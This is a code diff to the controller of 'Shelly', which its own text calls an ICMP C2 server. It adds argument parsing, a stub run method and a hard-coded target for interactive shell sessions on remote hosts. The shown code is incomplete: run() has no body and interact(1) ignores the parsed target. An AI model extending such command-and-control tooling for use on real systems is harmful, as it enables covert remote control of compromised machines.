@@ -85,6 +85,10 @@ class Controller(Host):
             print(f"{shellpack['data'].decode()}")
             shell_lock.value = False
 
+    def run(self):
+
+
+
     def help(self):
         help =  colored("     _          _ _       \n", "light_cyan")
         help += colored("    | |        | | |      \n", "light_cyan")
@@ -106,6 +110,9 @@ class Controller(Host):
         print(help)
 
 def main():
+    parser = argparse.ArgumentParser(
+                    prog='Shelly',
+                    description='ICMP C2 Server Controller')
     controller = Controller()
     
     if len(sys.argv) < 2 :
@@ -116,9 +123,12 @@ def main():
         case "ls":
             print(controller.list_hosts())
         case "interact":
-            controller.interact(int(sys.argv[2]))
+            parser.add_argument('-t', '--target', choices=[target['id'] for target in controller.db.all()], help='The target to interact with')
+            args = parser.parse_args()
+            print(args)
+            controller.interact(1)
         case "run":
-            print("Run a specific module")
+            controller.run()
         case "broadcast":
             print("Broadcast")
         case "help":
